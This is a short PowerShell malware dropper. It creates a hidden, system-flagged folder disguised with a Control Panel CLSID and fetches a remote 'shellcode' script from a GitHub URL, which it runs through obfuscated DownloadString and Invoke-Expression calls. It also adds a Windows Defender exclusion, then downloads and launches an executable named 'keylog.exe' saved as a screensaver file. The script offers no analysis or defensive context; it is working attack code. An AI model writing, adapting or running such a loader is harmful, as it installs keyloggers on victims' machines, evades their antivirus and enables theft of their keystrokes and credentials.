$rdir = "$env:localappdata\Loader"
$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
attrib +h +s $dir


$shellcode = ("https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/shellcode/freefire.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru


$url = "https://anonsharing.com/file/ad067c17c7feb767/keylog.exe"
$output = "$dir\log.scr"
Add-MpPreference -ExclusionPath $output
if (Test-Path -Path $output) {
    Write-Host "hello"
} else {
    Invoke-WebRequest -Uri $url -OutFile $output
}

Start-Process -FilePath $output
